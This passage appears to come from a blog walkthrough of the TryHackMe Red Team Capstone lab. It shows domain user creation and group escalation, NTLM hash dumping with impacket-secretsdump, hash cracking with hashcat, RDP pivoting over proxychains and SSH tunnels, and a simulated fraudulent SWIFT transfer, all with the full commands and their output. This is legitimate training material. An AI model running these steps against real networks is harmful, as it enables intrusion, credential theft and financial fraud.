</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>Connecting again with the administrator user:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># The Reason for specfing proxychains files as I am using two proxies</span>
<span class="c"># the first is tunneling traffic from the WKR1 or WRK2 to my attacking machine giving me direct access to the SERVERs and DC</span>
<span class="c"># The other one from the ROOTDC to my attacking machine giving me direct access to the bank.thereveres.loc child domain</span>
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/tmp/aaa]
└─<span class="nv">$ </span>proxychains <span class="nt">-q</span> <span class="nt">-f</span> proxychains4.conf xfreerdp /u:Administrator /p:<span class="s1">'Password1!'</span> +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101  
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2018.png" alt="Untitled" /></p><p>Since we have an administrator account then all child domains are owned now and their flags can be submitted.</p><ul><li><p><strong><em>Flag 9, Foothold on Bank Division Tier 2 Infrastructure</em></strong></p><li><p><strong><em>Flag 10, Administrative access to Bank Division Tier 2 Infrastructure</em></strong></p><li><p><strong><em>Flag 11, Foothold on Bank Division Tier 1 Infrastructure</em></strong></p><li><p><strong><em>Flag 12, Administrative access to Bank Division Tier 1 Infrastructure</em></strong></p><li><p><strong><em>Flag 13, Foothold on Bank Division Tier 0 Infrastructure</em></strong></p><li><p><strong><em>Flag 14, Administrative access to Bank Division Tier 0 Infrastructure</em></strong> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2019.png" alt="Untitled" /></p></ul><h2 id="compromise-of-swift-and-payment-transfer"><strong>Compromise of SWIFT and Payment Transfer</strong></h2><h3 id="enumeration-3"><strong>Enumeration</strong></h3><p><strong>From BANKDC Machine</strong></p><p>Let’s create our own user and enumerate the groups:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">ItsFadinG</span><span class="w"> </span><span class="s2">"adeladel22!"</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> </span><span class="nx">/add</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w">

</span><span class="n">Group</span><span class="w"> </span><span class="nx">Accounts</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">\\BANKDC</span><span class="w">
</span><span class="o">-------------------------------------------------------------------------------</span><span class="w">
</span><span class="o">*</span><span class="n">Cloneable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controllers</span><span class="w">
</span><span class="o">*</span><span class="n">DnsUpdateProxy</span><span class="w">
</span><span class="o">*</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="o">*</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Computers</span><span class="w">
</span><span class="o">*</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Controllers</span><span class="w">
</span><span class="o">*</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Guests</span><span class="w">
</span><span class="o">*</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="w">
</span><span class="o">*</span><span class="n">Group</span><span class="w"> </span><span class="nx">Policy</span><span class="w"> </span><span class="nx">Creator</span><span class="w"> </span><span class="nx">Owners</span><span class="w">
</span><span class="o">*</span><span class="n">Key</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="o">*</span><span class="n">Payment</span><span class="w"> </span><span class="nx">Approvers</span><span class="w">
</span><span class="o">*</span><span class="n">Payment</span><span class="w"> </span><span class="nx">Capturers</span><span class="w">
</span><span class="o">*</span><span class="n">Protected</span><span class="w"> </span><span class="nx">Users</span><span class="w">
</span><span class="o">*</span><span class="n">Read-only</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controllers</span><span class="w">
</span><span class="o">*</span><span class="n">Tier</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="o">*</span><span class="n">Tier</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="o">*</span><span class="n">Tier</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>Those two groups seems to be interesting; let’s add our user to them.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">ItsFadinG</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Payment Approvers"</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">ItsFadinG</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Payment Capturers"</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">ItsFadinG</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>Now that we have owned all the machines, let’s review our Project Goal:</p><blockquote><p>the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of &gt; the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure. However, the SWIFT backend exposes an internal web application at <a href="http://swift.bank.thereserve.loc/,">http://swift.bank.thereserve.loc/,</a> which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds:</p><blockquote><ol><li>A customer makes a request that funds should be transferred and receives a transfer code.<li>The customer contacts the bank and provides this transfer code.<li>An employee with the capturer role authenticates to the SWIFT application and <em>captures</em> the transfer.<li>An employee with the approver role reviews the transfer details and, if verified, <em>approves</em> the transfer. This has to be performed from a jump host.<li>Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified. Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.</ol></blockquote></blockquote><p>So what we need is to access the SWIFT web application, perform a transaction and have the ability to capture it and approve it. As the diagram of this network suggests, the SWIFT machine can be accessed only from the JMP machine.</p><p><strong>From JMP Machine</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>proxychains <span class="nt">-q</span> <span class="nt">-f</span> proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:ItsFadinG /p:<span class="s1">'adeladel22!'</span> +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.61
<span class="o">[</span>13:43:25:568] <span class="o">[</span>1073491:1073501] <span class="o">[</span>ERROR][com.winpr.timezone] - Unable to get current timezone rule
<span class="o">[</span>13:43:25:082] <span class="o">[</span>1073491:1073501] <span class="o">[</span>INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
<span class="o">[</span>13:43:25:082] <span class="o">[</span>1073491:1073501] <span class="o">[</span>INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<span class="o">[</span>13:43:25:174] <span class="o">[</span>1073491:1073501] <span class="o">[</span>INFO][com.freerdp.channels.rdpsnd.client] - <span class="o">[</span>static] Loaded fake backend <span class="k">for </span>rdpsnd
<span class="o">[</span>13:43:25:175] <span class="o">[</span>1073491:1073501] <span class="o">[</span>INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
<span class="o">[</span>13:43:25:175] <span class="o">[</span>1073491:1073501] <span class="o">[</span>INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
<span class="o">[</span>13:43:27:367] <span class="o">[</span>1073491:1073501] <span class="o">[</span>INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER <span class="o">[</span>LOGON_MSG_SESSION_CONTINUE]
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PS C:<span class="se">\U</span>sers<span class="se">\I</span>tsFadinG&gt; <span class="nb">hostname
</span>JMP
</pre></table></code></div></div><p>Let’s access the SWIFT web application: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2020.png" alt="Untitled" /></p><h3 id="dynamic-port-forwarding-1"><strong>Dynamic Port Forwarding</strong></h3><p>For better application inspection with Burp Suite, we could use Dynamic port forwarding to access this Swift web app from our attacking machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>PS C:<span class="se">\U</span>sers<span class="se">\I</span>tsFadinG&gt; ssh tunneluser@10.50.87.39 <span class="nt">-R</span> 9070 <span class="nt">-N</span>
The authenticity of host <span class="s1">'10.50.87.39 (10.50.87.39)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:vy8coHY0geP5OZvyw+zTPNkk9edAkZVP6DZxa7hSuls.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '</span>10.50.87.39<span class="s1">' (ECDSA) to the list of known hosts.
tunneluser@10.50.87.39'</span>s password:
</pre></table></code></div></div><h3 id="access-to-swift-application"><strong>Access to SWIFT application</strong></h3><p>Now we can gain <strong><em>flag 17, Access to SWIFT application”</em></strong> let’s see the instructions:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>In order to proof that you have access to the SWIFT system, dummy accounts have been created <span class="k">for </span>you and you will have to perform the following steps to prove access.
<span class="o">===============================================</span>
Account Details:
Source Email:           ItsFadinG@source.loc
Source Password:        tC1mulotC2R9ww
Source AccountID:       66966098984e4a2c8cd94573
Source Funds:           <span class="nv">$ </span>10 000 000

Destination Email:      ItsFadinG@destination.loc
Destination Password:   w4jd6RaQNCtfKw
Destination AccountID:  6696609a984e4a2c8cd94574
Destination Funds:      <span class="nv">$ </span>10
<span class="o">===============================================</span>

Using these details, perform the following steps:
1. Go to the SWIFT web application
2. Navigate to the Make a Transaction page
3. Issue a transfer using the Source account as Sender and the Destination account as Receiver. You will have to use the corresponding account IDs.
4. Issue the transfer <span class="k">for </span>the full 10 million dollars
5. Once completed, request verification of your transaction here <span class="o">(</span>No need to check your email once the transfer has been created<span class="o">)</span><span class="nb">.</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2021.png" alt="Untitled" /></p><p>We received a PIN in our email and using it we can confirm that our transaction was initiated. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2022.png" alt="Untitled" /></p><p>We have received flag 17, but after that we have received an important email: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2023.png" alt="Untitled" /></p><p>As stated, we need to have a capturer and approver account to be able to create our own transfer from start to finish and show impact.</p><h3 id="swift-capturer-and-capturer-access"><strong>SWIFT Capturer and Capturer Access</strong></h3><p>If you remember from our previous enumeration, we have found two interesting groups and added our users to them <strong>( Payment Approvers - Payment Capturers ).</strong> Let’s try to log in to the application using our domain username:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2024.png" alt="Untitled" /></p><p>Unfortunately, it didn’t work. Let’s check the other user, then change his password and try to login again.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\ItsFadinG</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Payment Capturers"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">bank.thereserve.loc.</span><span class="w">

</span><span class="n">Group</span><span class="w"> </span><span class="nx">name</span><span class="w">     </span><span class="nx">Payment</span><span class="w"> </span><span class="nx">Capturers</span><span class="w">

</span><span class="n">Members</span><span class="w">
</span><span class="o">-------------------------------------------------------------------------------</span><span class="w">
</span><span class="n">a.barker</span><span class="w">                 </span><span class="nx">c.young</span><span class="w">                  </span><span class="nx">g.watson</span><span class="w">
</span><span class="n">ItsFadinG</span><span class="w">                </span><span class="nx">s.harding</span><span class="w">                </span><span class="nx">t.buckley</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\ItsFadinG</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Payment Approvers"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">bank.thereserve.loc.</span><span class="w">

</span><span class="n">Group</span><span class="w"> </span><span class="nx">name</span><span class="w">     </span><span class="nx">Payment</span><span class="w"> </span><span class="nx">Approvers</span><span class="w">
</span><span class="n">Comment</span><span class="w">

</span><span class="n">Members</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------</span><span class="w">
</span><span class="n">a.holt</span><span class="w">                   </span><span class="nx">a.turner</span><span class="w">                 </span><span class="nx">ItsFadinG</span><span class="w">
</span><span class="n">r.davies</span><span class="w">                 </span><span class="nx">s.kemp</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\ItsFadinG</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">g.watson</span><span class="w"> </span><span class="s2">"adeladel22!"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">bank.thereserve.loc.</span><span class="w">

</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>But it didn’t work also: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2025.png" alt="Untitled" /></p><p>Hmm! This suggests that some users may be using different credentials for the SWIFT web app other than their active directory password. But other users may use the same password for both. So let’s try to dump all users’ passwords and crack them.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c"># Filtering for users that are only part of the Payment Approvers and Payment Capturers groups</span>
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>proxychains <span class="nt">-f</span> proxychains/proxychains_ROOTDC_To_BANKDC.conf <span class="nt">-q</span> impacket-secretsdump bank.thereserve.loc/ItsFadinG:<span class="s1">'adeladel22!'</span>@10.200.x.101
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
c.young:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
a.holt:1155:aad3b435b51404eeaad3b435b51404ee:d1b47b43b82460e3383d974366233ddc:::
a.turner:1234:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
a.barker:1309:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
s.harding:1198:aad3b435b51404eeaad3b435b51404ee:9e4a079d9c28c961d38bd2cca0c9cd5d:::
t.buckley:1273:aad3b435b51404eeaad3b435b51404ee:b8761a00e67b0023797eb3c988c86995:::
s.kemp:1321:aad3b435b51404eeaad3b435b51404ee:b2dd1c3f51cfb425db0a23090c58fe2e:::
r.davies:1221:aad3b435b51404eeaad3b435b51404ee:90a12d9dab5cd7b826964e169488d8e9:::
</pre></table></code></div></div><p>Let’s try to crack them</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 1000 <span class="nt">-a</span> 0 Hashes/PaymnetsGroupsUsers.hash /usr/share/wordlists/rockyou.txt <span class="nt">--show</span>
fbdcd5041c96ddbd82224270b57f11fc:Password!
</pre></table></code></div></div><p>Only one NTLM hash has been cracked, but luckily, three users are using the same password:</p><pre><code class="language-txt">a.turner:1234:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
a.barker:1309:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
c.young:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
</code></pre><p>let’s try to access the SWIFT web app with these creds only the <strong>c.young</strong> user worked as a Capturer user: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/3a9feb96-870a-4110-8b2f-2e2477fa7e49.png" alt="Untitled" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2026.png" alt="Untitled" /></p><p>Now we can submit:</p><ul><li><strong><em>Flag-18: Access to SWIFT application as capturer</em></strong></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>In order to proof that you have capturer access to the SWIFT system, a dummy transaction has been created <span class="k">for </span>you.

Please look <span class="k">for </span>a transaction with these details:

FROM:   631f60a3311625c0d29f5b32
TO:     66a23d8e984e4a04f6a2e06d

Look <span class="k">for </span>this transfer and capture <span class="o">(</span>forward<span class="o">)</span> the transaction.
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2027.png" alt="Untitled" /></p><p>Click forward, and we have received our flag! Now we need to get access to an Approver account. Since we have cracked three accounts, one of which is only part of the Payment Approvers group, let’s connect to the JMP machine using a.turner user.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC<span class="se">\p</span>roxychains]
└─<span class="nv">$ </span>proxychains <span class="nt">-q</span> <span class="nt">-f</span> proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:a.turner /p:<span class="s1">'Password!'</span> +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.61
<span class="o">[</span>15:07:47:271] <span class="o">[</span>1114772:1114790] <span class="o">[</span>ERROR][com.winpr.timezone] - Unable to get current timezone rule
<span class="o">[</span>15:07:47:885] <span class="o">[</span>1114772:1114790] <span class="o">[</span>INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
<span class="o">[</span>15:07:47:885] <span class="o">[</span>1114772:1114790] <span class="o">[</span>INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<span class="o">[</span>15:07:47:094] <span class="o">[</span>1114772:1114790] <span class="o">[</span>INFO][com.freerdp.channels.rdpsnd.client] - <span class="o">[</span>static] Loaded fake backend <span class="k">for </span>rdpsnd
<span class="o">[</span>15:07:47:095] <span class="o">[</span>1114772:1114790] <span class="o">[</span>INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
<span class="o">[</span>15:07:47:095] <span class="o">[</span>1114772:1114790] <span class="o">[</span>INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
<span class="o">[</span>15:07:49:623] <span class="o">[</span>1114772:1114790] <span class="o">[</span>INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING <span class="o">[</span>LOGON_MSG_SESSION_CONTINUE]
</pre></table></code></div></div><p>Surprise! It seems that Alison Turner has a bad memory, he has saved his password and has an open session on the JMP machine. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2028.png" alt="Untitled" /></p><p>let’s submit</p><ul><li><strong><em>Flag-19: Access to SWIFT application as approver</em></strong></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created <span class="k">for </span>you.

Please look <span class="k">for </span>a transaction with these details:

FROM:   631f60a3311625c0d29f5b31
TO:     66a23d8e984e4a04f6a2e06d

Look <span class="k">for </span>this transfer and approve <span class="o">(</span>forward<span class="o">)</span> the transaction.
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2029.png" alt="Untitled" /></p><h3 id="swift-simulated-fraudulent-transfer"><strong>SWIFT Simulated Fraudulent Transfer</strong></h3><p>We are one step away from our final goal and the last flag</p><ul><li><strong><em>Flag-20: Simulated fraudulent transfer made</em></strong></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>This is the final check! Please <span class="k">do </span>not attempt this <span class="k">if </span>you haven<span class="s1">'t completed all of the other flags.
Once done, follow these steps:
1. Using your DESTINATION credentials, authenticate to SWIFT
2. Using the PIN provided in the SWIFT access flag email, verify the transaction.
3. Using your capturer access, capture the verified transaction.
4. Using your approver access, approve the captured transaction.
5. Profit?
</span></pre></table></code></div></div><p><strong>Verifying The Transaction</strong></p><p>from <code class="language-plaintext highlighter-rouge">ItsFadinG@destination.loc</code> email <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2030.png" alt="Untitled" /></p><p><strong>Capture the Verified Transaction</strong></p><p>from <code class="language-plaintext highlighter-rouge">c.young@bank.thereserve.loc</code> email: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2031.png" alt="Untitled" /></p><p><strong>Approve The Captured Transaction</strong></p><p>from the <code class="language-plaintext highlighter-rouge">a.turner@bank.thereserve.loc</code> email: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2032.png" alt="Untitled" /></p><p>Let’s check the status of our transaction: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2033.png" alt="Untitled" /></p><p>And We Hacked the Bank!! <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2034.png" alt="Untitled" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2035.png" alt="Untitled" /></p><h2 id="summary-1"><strong>Summary</strong></h2><p>As Pivoting is a crucial step in any red team engagements, and it is a bit hard to follow. I decided to create a summary of my port forwarding methodology, which exclusively utilized Dynamic SSH Port Forwarding. This approach enabled secure, flexible access to internal network resources, playing a pivotal role in my overall strategy. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/PF-Summary.png" alt="Untitled" /></p><h2 id="conclusion"><strong>Conclusion</strong></h2><p>Completing the RedTeam Capstone Challenge was a journey that took me over two months, balanced alongside my military service. By sharing not only the direct solutions but also my failed attempts, I aimed to provide a more immersive experience. I hope you enjoyed it. Thank you for following along with my writeup. I welcome any feedback you may have. Until next time, Peace!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/redteaming/" class="post-tag no-text-decoration" >redteaming</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active directory</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a 